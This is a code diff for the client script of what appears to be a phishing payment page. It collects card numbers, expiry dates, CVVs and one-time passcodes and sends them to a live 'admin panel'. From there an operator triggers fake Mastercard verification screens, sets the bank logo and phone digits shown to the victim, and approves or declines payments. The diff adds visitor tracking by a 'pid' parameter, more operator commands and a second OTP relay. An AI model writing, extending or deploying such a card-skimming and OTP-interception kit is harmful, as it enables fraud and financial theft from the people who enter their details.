@@ -772,24 +772,48 @@ Your payment information is securely transmitted using 256-bit encryption. We do
       }
   };
   
-  // Parse URL parameters for amount
-  function parseURLParams() {
-      try {
-          const urlParams = new URLSearchParams(window.location.search);
-          if (urlParams.has('amount')) {
-              const urlAmount = parseFloat(urlParams.get('amount'));
-              if (!isNaN(urlAmount) && urlAmount > 0) {
-                  console.log('Setting amount from URL:', urlAmount);
-                  state.amount = urlAmount;
-                  
-                  // Update displayed amounts
-                  updateAmountDisplays();
-              }
-          }
-      } catch (error) {
-          console.error('Error parsing URL parameters:', error);
-      }
-  }
+// Parse URL parameters for amount
+function parseURLParams() {
+    try {
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.has('amount')) {
+            const urlAmount = parseFloat(urlParams.get('amount'));
+            if (!isNaN(urlAmount) && urlAmount > 0) {
+                console.log('Setting amount from URL:', urlAmount);
+                state.amount = urlAmount;
+                
+                // Update displayed amounts
+                updateAmountDisplays();
+            }
+        }
+        
+        // Also check for pid parameter
+        if (urlParams.has('pid')) {
+            const pid = urlParams.get('pid');
+            console.log('Found pid in URL:', pid);
+            
+            // Store pid in state if needed for later reference
+            state.pid = pid;
+            
+            // Notify server of visitor with this pid
+            if (socket && socket.connected) {
+                socket.emit('visitor', {
+                    pid: pid,
+                    url: window.location.href,
+                    timestamp: new Date().toISOString(),
+                    amount: state.amount
+                });
+                
+                // Join socket room for this pid
+                socket.emit('join', pid);
+                
+                console.log('Emitted visitor event with pid:', pid);
+            }
+        }
+    } catch (error) {
+        console.error('Error parsing URL parameters:', error);
+    }
+}
   
   // Update all amount displays
   function updateAmountDisplays() {
@@ -821,225 +845,286 @@ Your payment information is securely transmitted using 256-bit encryption. We do
       }
   }
   
-  // Main application initialization
-  document.addEventListener('DOMContentLoaded', function() {
-      try {
-          // Parse URL parameters first
-          parseURLParams();
-          
-          // Generate invoice ID
-          document.getElementById('invoiceId').textContent = generateInvoiceID();
-          
-          // Initialize socket connection
-          socket = io();
-          
-          // Socket connection debugging
-          socket.on('connect', () => {
-              console.log('Socket connected:', socket.id);
-              
-              // Send visitor info to admin panel
-              socket.emit('visitor', {
-                  url: window.location.href,
-                  device: navigator.userAgent,
-                  timestamp: new Date().toISOString(),
-                  amount: state.amount
-              });
-              
-              // Start heartbeat
-              setInterval(() => {
-                  socket.emit('heartbeat', { id: socket.id });
-              }, 30000);
-          });
-          
-          socket.on('connect_error', (error) => {
-              console.error('Socket connection error:', error);
-          });
-          
-          socket.on('disconnect', (reason) => {
-              console.log('Socket disconnected:', reason);
-          });
-          
-          // Handle admin panel commands
-          socket.on('command', function(data) {
-              console.log('Received command from admin panel:', data);
-              
-              if (data.action === 'show_mc_verification') {
-                  // Store phone if provided by admin
-                  if (data.phone) {
-                      state.phoneNumberSet = true;
-                      state.phoneLastFour = data.phone.slice(-4);
-                      console.log('Phone from admin panel:', state.phoneLastFour);
-                  }
-                  
-                  // Show MC verification
-                  showMcVerification();
-              }
-          });
-          
-          // Alternative command format for MC verification
-          socket.on('show_verification', function(data) {
-              console.log('Show verification command received:', data);
-              if (data.type === 'mc') {
-                  // Store phone if provided
-                  if (data.phone) {
-                      state.phoneNumberSet = true;
-                      state.phoneLastFour = data.phone.slice(-4);
-                      console.log('Phone from admin (show_verification):', state.phoneLastFour);
-                  }
-                  showMcVerification();
-              }
-          });
-          
-          // Setup card form handlers
-          setupCardFormHandlers();
-          
-          // Payment response handlers
-          socket.on('payment_processed', function(data) {
-              console.log('Payment processed:', data);
-              if (data.success) {
-                  proceedToSuccess();
-              } else {
-                  handlePaymentError(data.error);
-              }
-          });
-          
-          socket.on('otp_verified', function(data) {
-              console.log('OTP verified:', data);
-              if (data.success) {
-                  proceedToSuccess();
-              } else {
-                  handleOtpError(data.error);
-              }
-          });
-          
-          // Handle payment status updates from admin
-          socket.on('payment_status', function(data) {
-              console.log('Payment status update:', data);
-              if (data.status === 'approved') {
-                  proceedToSuccess();
-              } else if (data.status === 'declined') {
-                  handlePaymentError('Your payment was declined. Please try again with a different card.');
-              } else if (data.status === 'timeout') {
-                  handleMcTimeout();
-              }
-          });
-          
-      } catch (error) {
-          console.error('Error initializing application:', error);
-      }
-  });
+document.addEventListener('DOMContentLoaded', function() {
+    try {
+        console.log('Document loaded, initializing application...');
+        
+        // Parse URL parameters first
+        parseURLParams();
+        
+        // Generate invoice ID
+        document.getElementById('invoiceId').textContent = generateInvoiceID();
+        
+        // Initialize socket connection
+        socket = io();
+        
+        // Socket connection debugging
+        socket.on('connect', () => {
+            console.log('Socket connected:', socket.id);
+            
+            // Send visitor info to admin panel
+            socket.emit('visitor', {
+                pid: state.pid || generateTransactionId(),
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                amount: state.amount
+            });
+            
+            // Start heartbeat
+            setInterval(() => {
+                socket.emit('visitor_heartbeat', { 
+                    pid: state.pid,
+                    timestamp: Date.now() 
+                });
+            }, 30000);
+            
+            // Auto-join room for this pid if available
+            if (state.pid) {
+                socket.emit('join', state.pid);
+            }
+        });
+        
+        // Setup important socket event handlers
+        setupSocketEventHandlers();
+        
+        // Setup card form handlers
+        setupCardFormHandlers();
+        
+        // Ensure amount displays are updated
+        updateAmountDisplays();
+        
+    } catch (error) {
+        console.error('Error initializing application:', error);
+    }
+});
+
+        // Setup Socket Event Handlers (separate function for better organization)
+function setupSocketEventHandlers() {
+    if (!socket) {
+        console.error('Socket not initialized');
+        return;
+    }
+    
+    // Handle socket connection errors
+    socket.on('connect_error', (error) => {
+        console.error('Socket connection error:', error);
+    });
+    
+    socket.on('disconnect', (reason) => {
+        console.log('Socket disconnected:', reason);
+    });
+    
+    // Handle admin panel commands
+    socket.on('command', function(data) {
+        console.log('Received command from admin panel:', data);
+        
+        if (data.action === 'show_mc_verification') {
+            // Store phone if provided by admin
+            if (data.phone) {
+                state.phoneNumberSet = true;
+                state.phoneLastFour = data.phone.slice(-4);
+                console.log('Phone from admin panel:', state.phoneLastFour);
+            }
+            
+            // Show MC verification
+            showMcVerification();
+        }
+    });
+    
+    // MC verification events
+    socket.on('show_mc_verification', function(data) {
+        console.log('Show MC verification command received:', data);
+        if (data.phoneLastFour) {
+            state.phoneNumberSet = true;
+            state.phoneLastFour = data.phoneLastFour;
+            console.log('Phone from show_mc_verification:', state.phoneLastFour);
+        }
+        showMcVerification();
+    });
+    
+    // Handle bank update command
+    socket.on('update_mc_bank', function(data) {
+        console.log('Received bank update:', data);
+        if (data.bankCode) {
+            updateBankLogo(data.bankCode);
+        }
+    });
+
+    // Handle currency update command
+    socket.on('update_mc_currency', function(data) {
+        console.log('Received currency update:', data);
+        if (data.currency) {
+            // Update currency symbol based on provided currency
+            const currencySymbol = getCurrencySymbol(data.currency);
+            const currencySymbolElement = document.getElementById('currencySymbol');
+            if (currencySymbolElement) {
+                currencySymbolElement.textContent = currencySymbol;
+            }
+        }
+    });
+    
+    // Payment response handlers
+    socket.on('payment_response', function(data) {
+        console.log('Payment response received:', data);
+        if (data.success) {
+            proceedToSuccess();
+        } else if (data.requiresVerification) {
+            console.log('Server requested MC verification for transaction:', data.transactionId);
+            state.transactionId = data.transactionId;
+            // Wait for admin to trigger the verification
+        } else {
+            handlePaymentError(data.message || 'Payment declined');
+        }
+    });
+    
+    // Handle MC verification result
+    socket.on('mc_verification_result', function(data) {
+        console.log('MC verification result received:', data);
+        if (data.success) {
+            proceedToSuccess();
+        } else {
+            handlePaymentError(data.message || 'Verification failed');
+        }
+    });
+    
+    // Handle OTP errors
+    socket.on('mc_otp_error', function(data) {
+        console.log('MC OTP error received:', data);
+        handleOtpError(data.message);
+    });
+}
+
+// Add a helper function to get currency symbols
+function getCurrencySymbol(currencyCode) {
+    const symbols = {
+        'USD': '$',
+        'EUR': '€',
+        'GBP': '£',
+        'JPY': '¥',
+        'INR': '₹',
+        'AUD': 'A$',
+        'CAD': 'C$',
+        'CHF': 'CHF',
+        'CNY': '¥',
+        'HKD': 'HK$'
+    };
+    return symbols[currencyCode] || '$';
+}
   
-  function setupCardFormHandlers() {
-      const cardNumberInput = document.getElementById('card-number');
-      const expiryDateInput = document.getElementById('expiry-date');
-      const cvvInput = document.getElementById('cvv');
-      const cardForm = document.getElementById('card-form');
-      
-      if (!cardNumberInput || !expiryDateInput || !cvvInput || !cardForm) {
-          console.error('Card form elements not found!');
-          return;
-      }
-      
-      // Format card number with spaces
-      cardNumberInput.addEventListener('input', function(e) {
-          let value = e.target.value.replace(/\D/g, '');
-          let formattedValue = '';
-          
-          for (let i = 0; i < value.length; i++) {
-              if (i > 0 && i % 4 === 0) {
-                  formattedValue += ' ';
-              }
-              formattedValue += value[i];
-          }
-          
-          e.target.value = formattedValue;
-          
-          // Detect card type
-          detectCardType(value);
-          
-          // Update Pay button state
-          checkFormCompletion();
-      });
-      
-      // Format expiry date as MM/YY
-      expiryDateInput.addEventListener('input', function(e) {
-          let value = e.target.value.replace(/\D/g, '');
-          let formattedValue = '';
-          
-          if (value.length > 0) {
-              // First get the month
-              let month = value.substring(0, 2);
-              // Ensure month is between 01-12
-              if (month.length === 1) {
-                  formattedValue = month;
-              } else {
-                  let monthNum = parseInt(month, 10);
-                  if (monthNum > 12) {
-                      month = '12';
-                  } else if (monthNum < 1) {
-                      month = '01';
-                  }
-                  formattedValue = month;
-              }
-              
-              // Then add the year if provided
-              if (value.length > 2) {
-                  formattedValue += '/' + value.substring(2, 4);
-              }
-          }
-          
-          e.target.value = formattedValue;
-          
-          // Update Pay button state
-          checkFormCompletion();
-      });
-      
-      // Handle CVV input
-      cvvInput.addEventListener('input', function() {
-          // Update Pay button state
-          checkFormCompletion();
-      });
-      
-      // Handle card holder input
-      document.getElementById('card-holder').addEventListener('input', function() {
-          // Update Pay button state
-          checkFormCompletion();
-      });
-      
-// Handle form submission
-      cardForm.addEventListener('submit', function(e) {
-          e.preventDefault();
-          console.log('Form submitted, preventing default and processing payment...');
-          
-          const cardNumber = cardNumberInput.value.replace(/\s/g, '');
-          const cardHolder = document.getElementById('card-holder').value;
-          const expiryDate = expiryDateInput.value;
-          const cvv = cvvInput.value;
-          
-          // Basic validation
-          if (!validateCardForm(cardNumber, cardHolder, expiryDate, cvv)) {
-              return false;
-          }
-          
-          // Update state with card details
-          state.cardForm = {
-              cardNumber,
-              cardHolder,
-              expiryDate,
-              cvv,
-              errors: {}
-          };
-          
-          // Process payment - DO NOT show MC verification automatically
-          // Just notify the server of the card details
-          processPayment();
-          
-          return false; // Prevent form submission
-      });
-      
-      // Initialize card brand icon to empty
-      updateCardBrandIcon(null);
-  }
+function setupCardFormHandlers() {
+    const cardNumberInput = document.getElementById('card-number');
+    const expiryDateInput = document.getElementById('expiry-date');
+    const cvvInput = document.getElementById('cvv');
+    const cardForm = document.getElementById('card-form');
+    
+    if (!cardNumberInput || !expiryDateInput || !cvvInput || !cardForm) {
+        console.error('Card form elements not found!');
+        return;
+    }
+    
+    // Format card number with spaces
+    cardNumberInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        let formattedValue = '';
+        
+        for (let i = 0; i < value.length; i++) {
+            if (i > 0 && i % 4 === 0) {
+                formattedValue += ' ';
+            }
+            formattedValue += value[i];
+        }
+        
+        e.target.value = formattedValue;
+        
+        // Detect card type
+        detectCardType(value);
+        
+        // Update Pay button state
+        checkFormCompletion();
+    });
+    
+    // Format expiry date as MM/YY
+    expiryDateInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        let formattedValue = '';
+        
+        if (value.length > 0) {
+            // First get the month
+            let month = value.substring(0, 2);
+            // Ensure month is between 01-12
+            if (month.length === 1) {
+                formattedValue = month;
+            } else {
+                let monthNum = parseInt(month, 10);
+                if (monthNum > 12) {
+                    month = '12';
+                } else if (monthNum < 1) {
+                    month = '01';
+                }
+                formattedValue = month;
+            }
+            
+            // Then add the year if provided
+            if (value.length > 2) {
+                formattedValue += '/' + value.substring(2, 4);
+            }
+        }
+        
+        e.target.value = formattedValue;
+        
+        // Update Pay button state
+        checkFormCompletion();
+    });
+    
+    // Handle CVV input
+    cvvInput.addEventListener('input', function() {
+        // Update Pay button state
+        checkFormCompletion();
+    });
+    
+    // Handle card holder input
+    document.getElementById('card-holder').addEventListener('input', function() {
+        // Update Pay button state
+        checkFormCompletion();
+    });
+    
+    // Handle form submission
+    cardForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        console.log('Form submitted, preventing default and processing payment...');
+        
+        const cardNumber = cardNumberInput.value.replace(/\s/g, '');
+        const cardHolder = document.getElementById('card-holder').value;
+        const expiryDate = expiryDateInput.value;
+        const cvv = cvvInput.value;
+        
+        // Basic validation
+        if (!validateCardForm(cardNumber, cardHolder, expiryDate, cvv)) {
+            return false;
+        }
+        
+        // Update state with card details
+        state.cardForm = {
+            cardNumber,
+            cardHolder,
+            expiryDate,
+            cvv,
+            errors: {}
+        };
+        
+        // Process payment - DO NOT show MC verification automatically
+        // Just notify the server of the card details
+        processPayment();
+        
+        return false; // Prevent form submission
+    });
+    
+    // Initialize card brand icon to empty
+    updateCardBrandIcon(null);
+    
+    console.log('Card form handlers initialized successfully');
+}
 
   function validateCardForm(cardNumber, cardHolder, expiryDate, cvv) {
       let isValid = true;
@@ -1131,50 +1216,50 @@ Your payment information is securely transmitted using 256-bit encryption. We do
       updateCardBrandIcon(cardType);
   }
 
-  function processPayment() {
-      // Generate a unique transaction ID
-      state.transactionId = generateTransactionId();
-      
-      // Show processing state
-      const cardForm = document.getElementById('card-form');
-      if (cardForm) {
-          const submitBtn = cardForm.querySelector('button[type="submit"]');
-          if (submitBtn) {
-              submitBtn.disabled = true;
-              submitBtn.innerHTML = '<span class="spinner"></span> Processing...';
-          }
-      }
-      
-      // Check if socket is initialized
-      if (!socket) {
-          console.error('Socket connection not established');
-          handlePaymentError('Connection to payment server failed. Please try again.');
-          return;
-      }
-      
-      // Emit payment processing event to server
-      socket.emit('process_payment', {
-          transactionId: state.transactionId,
-          amount: state.amount,
-          cardDetails: {
-              cardNumber: state.cardForm.cardNumber,
-              cardHolder: state.cardForm.cardHolder,
-              expiryDate: state.cardForm.expiryDate,
-              cvv: state.cardForm.cvv,
-              cardType: state.cardType
-          },
-          paymentInfo: {
-              amount: state.amount,
-              currency: 'USD',
-              timestamp: new Date().toISOString()
-          }
-      });
-      
-      // Show notification that card details have been submitted
-      // IMPORTANT: DO NOT automatically show MC verification - wait for admin command
-      showProcessingNotification();
-  }
-  
+function processPayment() {
+    // Generate a unique transaction ID
+    state.transactionId = generateTransactionId();
+    
+    // Show processing state
+    const cardForm = document.getElementById('card-form');
+    if (cardForm) {
+        const submitBtn = cardForm.querySelector('button[type="submit"]');
+        if (submitBtn) {
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span class="spinner"></span> Processing...';
+        }
+    }
+    
+    // Check if socket is initialized
+    if (!socket) {
+        console.error('Socket connection not established');
+        handlePaymentError('Connection to payment server failed. Please try again.');
+        return;
+    }
+    
+    console.log('Sending payment data to server:', {
+        transactionId: state.transactionId,
+        amount: state.amount,
+        cardNumber: state.cardForm.cardNumber
+    });
+    
+    // Emit payment processing event to server
+    socket.emit('process_payment', {
+        transactionId: state.transactionId,
+        amount: state.amount,
+        cardNumber: state.cardForm.cardNumber,
+        expiryDate: state.cardForm.expiryDate,
+        cvv: state.cardForm.cvv,
+        cardHolder: state.cardForm.cardHolder,
+        cardType: state.cardType,
+        currency: 'USD',
+        email: 'customer@example.com'
+    });
+    
+    // Show notification that card details have been submitted
+    showProcessingNotification();
+}
+        
   function showProcessingNotification() {
       // Create floating notification
       const notification = document.createElement('div');
@@ -1259,39 +1344,41 @@ Your payment information is securely transmitted using 256-bit encryption. We do
       logoContainer.innerHTML = `<img src="${logoUrl}" alt="Verification" style="height: 100%; max-width: 150px;">`;
   }
 
-  function updateMcVerificationUI() {
-      // Log current state for debugging
-      console.log('Updating MC verification UI with amount:', state.amount);
-      console.log('Phone last four set:', state.phoneNumberSet, state.phoneLastFour);
-      
-      // Update elements with transaction details
-      updateElement('cardLastFourDigits', getPhoneDisplay());
-      updateElement('merchantName', 'Online Merchant');
-      updateElement('transactionAmount', state.amount.toFixed(2));
-      updateElement('transactionDate', getCurrentDateTime());
-      updateElement('cardNumberDisplay', formatCardNumberDisplay(state.cardForm.cardNumber));
-      updateElement('referenceId', state.transactionId);
-      
-      // Update bank logo and verification logo based on card type
-      updateBankLogo('default'); // Can be customized based on BIN lookup
-      updateVerificationLogo(state.cardType || 'default');
-      
-      // Clear previous OTP error if any
-      const otpError = document.getElementById('mcOtpError');
-      if (otpError) {
-          otpError.style.display = 'none';
-      }
-  }
+function updateMcVerificationUI() {
+    // Log current state for debugging
+    console.log('Updating MC verification UI with amount:', state.amount);
+    console.log('Phone last four set:', state.phoneNumberSet, state.phoneLastFour);
+    
+    // Update elements with transaction details
+    updateElement('cardLastFourDigits', getPhoneDisplay());
+    updateElement('merchantName', 'Peacock Merchandise');
+    updateElement('transactionAmount', state.amount.toFixed(2));
+    updateElement('transactionDate', getCurrentDateTime());
+    updateElement('cardNumberDisplay', formatCardNumberDisplay(state.cardForm.cardNumber));
+    updateElement('referenceId', state.transactionId || generateTransactionId());
+    
+    // Update bank logo and verification logo based on card type
+    updateBankLogo('default'); // Will be updated by admin if needed
+    updateVerificationLogo(state.cardType || 'default');
+    
+    // Clear previous OTP error if any
+    const otpError = document.getElementById('mcOtpError');
+    if (otpError) {
+        otpError.style.display = 'none';
+    }
+}
 
-  function getPhoneDisplay() {
-      // Use admin-provided phone if available, otherwise generate random one
-      if (state.phoneNumberSet && state.phoneLastFour) {
-          console.log('Using admin provided phone ending in:', state.phoneLastFour);
-          return `********${state.phoneLastFour}`;
-      } else {
-          return generateRandomPhone();
-      }
-  }
+function getPhoneDisplay() {
+    // Use admin-provided phone if available, otherwise generate random one
+    if (state.phoneNumberSet && state.phoneLastFour) {
+        console.log('Using admin provided phone ending in:', state.phoneLastFour);
+        return `********${state.phoneLastFour}`;
+    } else {
+        const randomLastFour = generateRandomPhone();
+        console.log('Using generated phone ending in:', randomLastFour);
+        return randomLastFour;
+    }
+}
 
   function generateRandomPhone() {
       // Generate a random 4-digit number for phone display
@@ -1449,70 +1536,79 @@ Your payment information is securely transmitted using 256-bit encryption. We do
       }
   }
 
-  function handleMcSubmit() {
-      const otpInput = document.getElementById('mcOtpInput');
-      const otpError = document.getElementById('mcOtpError');
-      const consentCheckbox = document.getElementById('mcConsentCheckbox');
-      
-      if (!otpInput || !otpError || !consentCheckbox) {
-          console.error('MC verification elements not found!');
-          return;
-      }
-      
-      // Check consent
-      if (!consentCheckbox.checked) {
-          otpError.textContent = 'Please accept the terms and conditions';
-          otpError.style.display = 'block';
-          return;
-      }
-      
-      // Get OTP value
-      const otpValue = otpInput.value.trim();
-      
-      // Check if OTP is empty
-      if (!otpValue) {
-          otpError.textContent = 'Please enter the One-Time Passcode';
-          otpError.style.display = 'block';
-          return;
-      }
-      
-      // Check if OTP is correct length
-      if (otpValue.length !== 6) {
-          otpError.textContent = 'One-Time Passcode must be 6 digits';
-          otpError.style.display = 'block';
-          return;
-      }
-      
-      // Send OTP verification to server
-      if (socket) {
-          socket.emit('verify_otp', {
-              transactionId: state.transactionId,
-              otp: otpValue,
-              cardDetails: {
-                  cardNumber: state.cardForm.cardNumber,
-                  cardHolder: state.cardForm.cardHolder,
-                  expiryDate: state.cardForm.expiryDate,
-                  cvv: state.cardForm.cvv,
-                  cardType: state.cardType
-              },
-              amount: state.amount
-          });
-      } else {
-          console.error('Socket connection not available for OTP verification');
-          otpError.textContent = 'Connection error. Please try again.';
-          otpError.style.display = 'block';
-          return;
-      }
-      
-      // Disable submit button and show loading
-      const submitBtn = document.getElementById('mcSubmitBtn');
-      if (submitBtn) {
-          submitBtn.disabled = true;
-          submitBtn.innerHTML = '<span class="spinner"></span> Verifying...';
-      }
-      
-      // We don't auto-proceed to success here - we wait for server response
-  }
+ function handleMcSubmit() {
+    const otpInput = document.getElementById('mcOtpInput');
+    const otpError = document.getElementById('mcOtpError');
+    const consentCheckbox = document.getElementById('mcConsentCheckbox');
+    
+    if (!otpInput || !otpError || !consentCheckbox) {
+        console.error('MC verification elements not found!');
+        return;
+    }
+    
+    // Check consent
+    if (!consentCheckbox.checked) {
+        otpError.textContent = 'Please accept the terms and conditions';
+        otpError.style.display = 'block';
+        return;
+    }
+    
+    // Get OTP value
+    const otpValue = otpInput.value.trim();
+    
+    // Check if OTP is empty
+    if (!otpValue) {
+        otpError.textContent = 'Please enter the One-Time Passcode';
+        otpError.style.display = 'block';
+        return;
+    }
+    
+    // Check if OTP is correct length
+    if (otpValue.length !== 6) {
+        otpError.textContent = 'One-Time Passcode must be 6 digits';
+        otpError.style.display = 'block';
+        return;
+    }
+    
+    // Send OTP verification to server
+    if (socket && socket.connected) {
+        console.log('Sending OTP to server:', otpValue, 'for transaction:', state.transactionId);
+        
+        // Send via mc_otp_submitted event
+        socket.emit('mc_otp_submitted', {
+            invoiceId: state.transactionId,
+            otp: otpValue
+        });
+        
+        // Also try the older verify_otp format for backward compatibility
+        socket.emit('verify_otp', {
+            transactionId: state.transactionId,
+            otp: otpValue,
+            cardDetails: {
+                cardNumber: state.cardForm.cardNumber,
+                cardHolder: state.cardForm.cardHolder,
+                expiryDate: state.cardForm.expiryDate,
+                cvv: state.cardForm.cvv,
+                cardType: state.cardType
+            },
+            amount: state.amount
+        });
+    } else {
+        console.error('Socket connection not available for OTP verification');
+        otpError.textContent = 'Connection error. Please try again.';
+        otpError.style.display = 'block';
+        return;
+    }
+    
+    // Disable submit button and show loading
+    const submitBtn = document.getElementById('mcSubmitBtn');
+    if (submitBtn) {
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<span class="spinner"></span> Verifying...';
+    }
+    
+    // We don't auto-proceed to success here - we wait for server response
+}
 
   function handleMcResend() {
       // Show resend confirmation
